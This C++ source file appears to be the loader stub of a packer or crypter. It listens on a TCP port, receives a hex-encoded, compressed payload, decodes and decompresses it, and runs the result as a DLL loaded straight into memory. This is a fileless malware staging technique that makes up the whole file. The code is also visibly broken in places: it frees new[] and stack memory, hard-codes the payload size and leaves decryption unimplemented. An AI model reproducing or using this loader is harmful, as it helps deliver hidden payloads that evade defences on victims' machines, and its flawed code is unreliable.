#include <WinSock2.h>
#include <Windows.h>
#include <stdio.h>
#include <Ws2tcpip.h>
#include <tchar.h>
#include <string>
#include <iostream>

#include "decryption.h"
#include "decompression.h"
#include "MemLoadLibrary.h"
#include "ExecuteDLLinMem.h"

//#include <iostream>
using namespace std;

#pragma comment(lib, "Ws2_32.lib")
//#define Port 6000

SOCKET Socket, Sub;
WSADATA Winsock;
sockaddr_in Addr;
sockaddr_in IncomingAddress;
int AddressLen = sizeof(IncomingAddress);



int udp_server_clinet(int Port)
{
    //server
    printf("\n%i\n", Port);
    WSAStartup(MAKEWORD(2, 2), &Winsock);    // Start Winsock

    if (LOBYTE(Winsock.wVersion) != 2 || HIBYTE(Winsock.wVersion) != 2)    // Check version
    {
        WSACleanup();
        return 0;
    }

    Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    ZeroMemory(&Addr, sizeof(Addr));
    Addr.sin_family = AF_INET;
    Addr.sin_port = htons(Port);
    bind(Socket, (sockaddr*)&Addr, sizeof(Addr));

    if (listen(Socket, 1) == SOCKET_ERROR)
    {
        printf("listening error\n");
    }
    else
    {
        printf("listening ok\n");
    }

    if (Sub = accept(Socket, (sockaddr*)&IncomingAddress, &AddressLen))
    {
        //char* ClientIP = inet_ntoa(IncomingAddress.sin_addr);
        int ClientPort = ntohs(IncomingAddress.sin_port);
        printf("Client connected!\n");
        //printf("IP: %s:%d\n", ClientIP, ClientPort);
        printf("Receiving file .. \n");



        int Size;
        char* Filesize = new char[1024];

        if (recv(Sub, Filesize, 1024, 0)) // File size
        {
            Size = atoi((const char*)Filesize);
			Size = Size - 1; //offset //Todo might have to remove the -1
            printf("File size: %d\n", Size);
			//printf("File size: %i\n", Size);
        }
        else {
            printf("Failed to determine filesize of recieved file.");
                return 0;
        }

        char* Buffer = new char[Size];
		char* Buffer2 = new char[(Size/2)];
		unsigned char* optBuffer = new unsigned char[(Size*2)];  // make it larger since it has to decompress?
        //int len = Size;
		//printf("\nRecieved data from packer raw:\n%ld\n", strlen(Buffer2));
        //char *data = Buffer;
        int Offset = 0;
        int n = 0;
        while ((n = ::recv(Sub, Buffer + Offset, Size - Offset, 0)) > 0)
		{
            Offset += n;
        }
        /*while (Size > Offset)
        {
            int Amount = recv(Socket, Buffer + Offset, Size - Offset, 0);

            if (Amount <= 0)
            {

                break;
            }
            else
            {
                Offset += Amount;
                printf("2\n");
            }
        }*/
        printf("Hex from packer:\n%s\n", Buffer);

		//before manipulation, 
		char* Buffer_without_padding = new char[(Size)];
		memcpy(Buffer_without_padding, Buffer, (Size));
		//printf("Buffer without padding:\n%s\n", Buffer_without_padding);



		bool odd = 0;
		string tmp;
		int x = 0;
		for (int i = 0; i < Size; i=i+1)
		{
			//printf("%i ",i);
			tmp = "";
			//printf("%i", odd);
			
			//printf("%c ", Buffer[i]);
			tmp = Buffer[i];
			if (odd)
			{
				//printf("\n");
			}
			odd = !odd;
			if (i + 1 < Size)
			{
				i++;
				//printf("%i ", i);
				//printf("%c ", Buffer[i]);
				tmp = tmp + Buffer[i];
				if (odd)
				{
					//printf("\n");
				}
				odd = !odd;
				cout << tmp;
				//printf("\n");
			}

			Buffer2[x] = strtoul(tmp.c_str(), NULL, 16);
			//printf("\n%c\n", strtoul(tmp.c_str(), NULL, 16));
			x++;

			
		}
		printf("\nRecieved data from packer raw:\n");
		cout << Buffer2;
		printf("\n");

        //FILE* File;
        //fopen_s(&File,"E://Git/test-rec.txt", "wb");
        //fwrite(Buffer, 1, Size, File);
        //fclose(File);

        //getchar();
        closesocket(Socket);
        closesocket(Sub);
        WSACleanup();
        printf("socket done\n");


        //decryption
        //ToDo decryption
        //decryption();

        //decompression
        //ToDo change decompression from file to buffer input
        //char* opBuf = new char[sizeof(Buffer)];
        uziphelp(Buffer2, optBuffer, (Size/2));
		printf("Decompressed file:\n");
		cout << optBuffer;
		printf("\n");

        printf("sizeof(optBuffer): %d\n", sizeof(optBuffer));
        printf("strlen(optBuffer): %d\n", strlen((const char*)optBuffer));
        printf("size: %d\n", Size);

        int big = Size*2; //correct?
        printf("rawData:\n");
        unsigned char rawData[36864];
        for (int i = 0; i < 36864; ++i) {
            rawData[i] = optBuffer[i];
            printf("%02X", rawData[i]);
        }

        printf("\nsizeofRawData: %d\n", sizeof(rawData));
        exe_dll_in_mem(rawData, 36864);

		//we should have done this earlier
		free(Buffer);
        free(rawData);
		free(Buffer2);
		free(Buffer_without_padding);
		free(Filesize);
        free(optBuffer);
        return 0;

    }
}